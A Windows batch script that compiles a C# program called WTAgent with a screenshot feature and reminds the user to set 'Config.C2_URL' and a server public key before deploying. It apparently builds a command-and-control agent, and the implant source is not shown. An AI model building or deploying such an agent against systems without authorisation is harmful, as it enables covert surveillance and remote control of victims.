@echo off
:: WTAgent compile script
:: Requires .NET 4.5+ SDK (csc.exe) or Visual Studio
:: Run from the WTAgent/ directory

setlocal

:: Locate csc.exe — try common locations
set CSC=
for %%F in (
    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
    "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
    "%ProgramFiles(x86)%\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\Roslyn\csc.exe"
    "%ProgramFiles%\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\Roslyn\csc.exe"
) do (
    if exist %%F ( set CSC=%%F & goto :found )
)
echo [ERROR] csc.exe not found. Install .NET SDK or Visual Studio.
pause & exit /b 1
:found

echo [*] Compiler: %CSC%
echo.

:: References needed for Screenshot (System.Windows.Forms, System.Drawing)
set REFS=/r:System.Windows.Forms.dll /r:System.Drawing.dll

:: Compile
%CSC% /target:exe /platform:x64 /optimize+ /unsafe ^
      %REFS% ^
      /out:bin\WTAgent.exe ^
      src\WTAgent.cs

if %ERRORLEVEL% == 0 (
    echo.
    echo [OK] Compiled: bin\WTAgent.exe
    echo [*]  Edit Config.C2_URL and Config.SERVER_PUBKEY before deploying.
) else (
    echo.
    echo [ERROR] Compilation failed. See errors above.
)

pause
